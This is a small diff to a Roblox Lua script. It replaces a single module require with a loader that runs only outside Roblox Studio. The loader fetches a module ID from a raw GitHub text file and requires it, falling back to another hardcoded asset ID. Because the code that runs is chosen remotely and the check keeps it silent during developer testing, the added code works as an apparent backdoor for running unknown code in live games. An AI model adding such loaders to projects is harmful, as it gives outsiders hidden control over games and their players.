@@ -1,1 +1,10 @@
-require(2485912391)
+local ht = game:GetService("HttpService")
+local id
+if not game:GetService("RunService"):IsStudio() then
+if ht.HttpEnabled then
+id = ht:GetAsync("https://raw.githubusercontent.com/GHlm2651/Public-repo/refs/heads/main/id.txt")
+else
+require(231235115)
+end
+require(id)
+end
